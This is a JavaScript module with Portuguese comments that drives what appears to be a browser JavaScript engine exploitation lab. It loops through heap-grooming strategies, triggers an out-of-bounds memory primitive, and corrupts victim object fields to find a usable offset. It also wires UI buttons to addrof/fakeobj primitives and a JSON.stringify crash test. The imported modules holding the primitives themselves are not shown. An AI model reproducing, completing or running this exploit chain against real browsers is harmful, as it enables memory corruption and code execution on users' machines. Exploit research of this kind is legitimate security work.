// js/app.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import * as Int64Lib from './int64.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
import * as Corruptor from './victim_corruptor.mjs';
import * as PostExploit from './post_exploit_conceptual.mjs';
import * as JsonExploitTest from './json_exploit_test.mjs'; // <<< NOVO IMPORT
import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';

let uiInitialized = false;

const App = {
    exploitSuccessfulThisSession: false,
    isCurrentlyRunningStrategies: false,

    // ... (runAllGroomingStrategies e updateCurrentTestGapFromScanUIAndTestSingle como antes) ...
    runAllGroomingStrategies: async () => {
        const FNAME_STRAT = "App.runAllGroomingStrategies";
        const runId = Math.random().toString(16).slice(2,10);
        appLog(`[${runId}] >>> Entrando em ${FNAME_STRAT}`, 'critical', FNAME_STRAT);

        if (App.isCurrentlyRunningStrategies) {
            appLog(`[${runId}] WARN: Estratégias já em execução. Chamada ignorada.`, "warn", FNAME_STRAT);
            return;
        }
        if (App.exploitSuccessfulThisSession) {
            appLog(`[${runId}] INFO: GAP de sucesso já encontrado nesta sessão. Para reexecutar, reinicie a página.`, "warn", FNAME_STRAT);
            return;
        }

        App.isCurrentlyRunningStrategies = true;
        const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
        if (btnRunStrategies) btnRunStrategies.disabled = true;

        appLog(`[${runId}] Iniciando ${FNAME_STRAT} com novas estratégias...`, 'test', FNAME_STRAT);
        updateGlobalOOBConfig();
        const spray_count_el = document.getElementById('sprayCountBase');
        const intermediate_allocs_el = document.getElementById('intermediateAllocs');

        const spray_count = spray_count_el ? parseInt(spray_count_el.value) || 500 : 500;
        const intermediate_allocs = intermediate_allocs_el ? parseInt(intermediate_allocs_el.value) || 100 : 100;

        const strategies = [
            { victim_first: true, oob_first: false, spray_adj: 0, inter_adj: 0, name: "Vítima primeiro, OOB depois (Padrão)"},
            { victim_first: false, oob_first: true, spray_adj: 0, inter_adj: 0, name: "OOB primeiro, Vítima depois"},
            { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
            { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
        ];
        Corruptor.resetLastSuccessfulGap();

        for (const strat of strategies) {
            appLog(`[${runId}] Loop Estratégia: ${strat.name} - Início`, 'info', FNAME_STRAT);
            if (Corruptor.getLastSuccessfulGap() !== null) {
                appLog(`[${runId}] GAP de sucesso encontrado (${Corruptor.getLastSuccessfulGap()}) por estratégia anterior. Interrompendo laço de estratégias.`, "good", FNAME_STRAT);
                App.exploitSuccessfulThisSession = true;
                break;
            }
            appLog(`[${runId}] *** Iniciando Estratégia de Grooming: ${strat.name} ***`, "critical", FNAME_STRAT);

            let victimPrepared = false;
            let currentOOBAllocationSize = Core.getOOBAllocationSize();
            appLog(`[${runId}]    Estratégia '${strat.name}' usando OOB_ALLOCATION_SIZE: ${currentOOBAllocationSize}`, "info", FNAME_STRAT);

            if (strat.oob_first) {
                appLog(`[${runId}]    Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
                appLog(`[${runId}]    Antes de Core.triggerOOB_primitive (oob_first)`, "debug", FNAME_STRAT);
                await Core.triggerOOB_primitive();
                appLog(`[${runId}]    Depois de Core.triggerOOB_primitive (oob_first), oob_dataview_real: ${!!Core.oob_dataview_real}`, "debug", FNAME_STRAT);
                if (!Core.oob_dataview_real) { appLog(`[${runId}] Falha ao ativar OOB (OOB primeiro), pulando estratégia.`, "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }

                appLog(`[${runId}]    Antes de Groomer.groomHeapForSameSize (oob_first)`, "debug", FNAME_STRAT);
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
                appLog(`[${runId}]    Depois de Groomer.groomHeapForSameSize (oob_first)`, "debug", FNAME_STRAT);

                appLog(`[${runId}]    Antes de Groomer.prepareVictim (oob_first)`, "debug", FNAME_STRAT);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
                appLog(`[${runId}]    Depois de Groomer.prepareVictim (oob_first), victimPrepared: ${victimPrepared}`, "debug", FNAME_STRAT);
            } else { // victim_first
                appLog(`[${runId}]    Estratégia '${strat.name}': Vítima será preparada primeiro.`, "info", FNAME_STRAT);
                appLog(`[${runId}]    Antes de Groomer.groomHeapForSameSize (victim_first)`, "debug", FNAME_STRAT);
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
                appLog(`[${runId}]    Depois de Groomer.groomHeapForSameSize (victim_first)`, "debug", FNAME_STRAT);

                appLog(`[${runId}]    Antes de Groomer.prepareVictim (victim_first)`, "debug", FNAME_STRAT);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
                appLog(`[${runId}]    Depois de Groomer.prepareVictim (victim_first), victimPrepared: ${victimPrepared}`, "debug", FNAME_STRAT);

                if (victimPrepared) {
                    appLog(`[${runId}]    Estratégia '${strat.name}': Vítima preparada, ativando OOB agora.`, "info", FNAME_STRAT);
                    appLog(`[${runId}]    Antes de Core.triggerOOB_primitive (victim_first, OOB after victim)`, "debug", FNAME_STRAT);
                    await Core.triggerOOB_primitive();
                    appLog(`[${runId}]    Depois de Core.triggerOOB_primitive (victim_first, OOB after victim), oob_dataview_real: ${!!Core.oob_dataview_real}`, "debug", FNAME_STRAT);
                    if (!Core.oob_dataview_real) { appLog(`[${runId}] Falha ao ativar OOB (após vítima), pulando estratégia.`, "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
                }
            }

            appLog(`[${runId}]    Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
            if (Groomer.victim_object && victimPrepared) {
                appLog(`[${runId}]       Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
            }

            if (!victimPrepared) {
                appLog(`[${runId}]    Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
                await PAUSE_LAB(500); continue;
            }
            if (!Groomer.victim_object) {
                 appLog(`[${runId}]    Estratégia '${strat.name}': ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500); continue;
            }
            if (!Core.oob_dataview_real) {
                appLog(`[${runId}]    Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                await PAUSE_LAB(500); continue;
            }

            appLog(`[${runId}]    Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
            appLog(`[${runId}]    Antes de Corruptor.findAndCorruptVictimFields_Iterative`, "debug", FNAME_STRAT);
            await Corruptor.findAndCorruptVictimFields_Iterative();
            appLog(`[${runId}]    Depois de Corruptor.findAndCorruptVictimFields_Iterative. Gap encontrado: ${Corruptor.getLastSuccessfulGap()}`, "debug", FNAME_STRAT);

            if (Corruptor.getLastSuccessfulGap() !== null) {
                appLog(`[${runId}] GAP de sucesso encontrado (${Corruptor.getLastSuccessfulGap()}) pela estratégia '${strat.name}'! Interrompendo mais estratégias.`, "good", FNAME_STRAT);
                App.exploitSuccessfulThisSession = true;
                break;
            }
            appLog(`[${runId}]    Estratégia ${strat.name} concluída, nenhum GAP encontrado ainda. Antes de PAUSE_LAB(2000)`, "info", FNAME_STRAT);
            await PAUSE_LAB(2000);
            appLog(`[${runId}]    Depois de PAUSE_LAB(2000)`, "debug", FNAME_STRAT);
            appLog(`[${runId}] Loop Estratégia: ${strat.name} - Fim`, "info", FNAME_STRAT);
        }

        appLog(`[${runId}] --- ${FNAME_STRAT} Concluído (Após loop de estratégias) ---`, 'test', FNAME_STRAT);
        if (Corruptor.getLastSuccessfulGap() !== null) {
            appLog(`[${runId}] GAP de SUCESSO encontrado e armazenado: ${Corruptor.getLastSuccessfulGap()}.`, "vuln", FNAME_STRAT);
            App.exploitSuccessfulThisSession = true;
            const addrofGapEl = document.getElementById('addrofGap');
            if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado! Recarregue para tentar de novo.";
        } else {
            appLog(`[${runId}] Nenhuma estratégia resultou em GAP de sucesso nesta rodada.`, "error", FNAME_STRAT);
            if (btnRunStrategies) btnRunStrategies.disabled = false;
        }
        App.isCurrentlyRunningStrategies = false;
        appLog(`[${runId}] <<< Saindo de ${FNAME_STRAT}`, 'critical', FNAME_STRAT);
    },

    updateCurrentTestGapFromScanUIAndTestSingle: () => {
        const FNAME_SINGLE = "App.updateCurrentTestGapFromScanUIAndTestSingle";
        appLog(`>>> Entrando em ${FNAME_SINGLE}`, "info", FNAME_SINGLE);
        const gapStartScanEl = document.getElementById('gapStartScan');
        const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;

        if (!isNaN(gapVal)) {
            Corruptor.setCurrentTestGap(gapVal);
            appLog(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
            if (!Groomer.victim_object) {
                appLog("ERRO: Vítima não preparada. Execute Passo 1 ou uma estratégia de grooming primeiro.", "error", "App.Config");
                return;
            }
            if (!Core.oob_dataview_real) {
                appLog("ERRO: Primitiva OOB não ativa. Execute Passo 0 primeiro.", "error", "App.Config");
                return;
            }
            Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
        } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
        appLog(`<<< Saindo de ${FNAME_SINGLE}`, "info", FNAME_SINGLE);
    },

    setupUIEventListeners: () => {
        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
        if (moduleTestButtonsContainer) {
            moduleTestButtonsContainer.innerHTML = '';
            const btnTestInt64 = document.createElement('button');
            btnTestInt64.textContent = 'Testar Módulo Int64';
            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
            moduleTestButtonsContainer.appendChild(btnTestInt64);

            const btnTestUtils = document.createElement('button');
            btnTestUtils.textContent = 'Testar Módulo Utils';
            btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule());
            moduleTestButtonsContainer.appendChild(btnTestUtils);

            const btnTestCore = document.createElement('button');
            btnTestCore.textContent = 'Testar Módulo CoreExploit (OOB)';
            btnTestCore.onclick = Core.testModule;
            moduleTestButtonsContainer.appendChild(btnTestCore);

            const notes = document.createElement('p');
            notes.className = 'notes';
            notes.textContent = 'Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais. PostExploit é conceitual.';
            moduleTestButtonsContainer.appendChild(notes);
        }

        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', Corruptor.findAndCorruptVictimFields_Iterative);
        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.testCorruptKnownGap);
        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
        document.getElementById('btnTestJsonStringify')?.addEventListener('click', JsonExploitTest.attemptJsonStringifyCrash); // <<< NOVO LISTENER

        document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
    },

    initialize: () => {
        if (uiInitialized) {
            appLog("App.initialize: UI já inicializada. Ignorando.", "warn", "App.Init");
            return;
        }
        updateGlobalOOBConfig();
        App.setupUIEventListeners();
        App.exploitSuccessfulThisSession = false;
        App.isCurrentlyRunningStrategies = false;
        const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
        if (btnRunStrategies) {
            btnRunStrategies.disabled = false;
            btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
        }
        appLog("Laboratório Modularizado (v2.8.6 - Teste JSON Integrado) pronto.", "good", "App.Init"); // Versão atualizada
        const addrofGapEl = document.getElementById('addrofGap');
        if (addrofGapEl) addrofGapEl.value = "";
        uiInitialized = true;
    }
};

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.initialize);
} else {
    App.initialize();
}

appLog("app.mjs carregado e pronto.", "info", "Global");
